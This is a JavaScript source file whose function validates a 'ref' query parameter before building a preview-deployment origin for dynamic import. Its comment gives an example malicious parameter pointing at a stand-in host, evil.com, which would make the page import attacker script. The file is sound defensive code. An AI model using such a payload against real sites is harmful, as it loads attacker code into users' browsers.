// Shared by scripts/da/da.js and scripts/quick-edit/quick-edit.js: both parse
// a `ref` from a URL query param (?dapreview=/?quick-edit=) and build a
// preview-deployment origin from it, which is then dynamically imported.
//
// A real ref is a short git-ref-safe token — never a full host, path, or
// query string. Without REF_PATTERN, `?dapreview=evil.com/x.js?x=` resolves
// (via straight string interpolation) to the origin `evil.com` — confirmed
// live: `new URL('https://evil.com/x.js?x=--da-live--adobe.aem.live').origin`
// returns `https://evil.com`. That's a dynamic-import-from-attacker-origin
// vector, not just an XSS footgun.
//
// Named and registered as a trusted `escape.methods` sanitizer in
// eslint.config.js's no-unsanitized/method config — this function's contract
// (never returns anything except one of `onOrigin`/`localOrigin` verbatim, or
// a string built only from REF_PATTERN-validated characters) is what the
// lint rule is trusting when it allows callers to pass the result straight
// into `import()`.
const REF_PATTERN = /^[a-z0-9-]+$/i;

export const resolvePreviewOrigin = (ref, {
  onOrigin, localOrigin, branchHost, treatEmptyAsOn = false,
}) => {
  if (ref === 'on' || (treatEmptyAsOn && !ref)) return onOrigin;
  if (ref === 'local') return localOrigin;
  if (ref && REF_PATTERN.test(ref)) return `https://${ref}--${branchHost}`;
  return null;
};
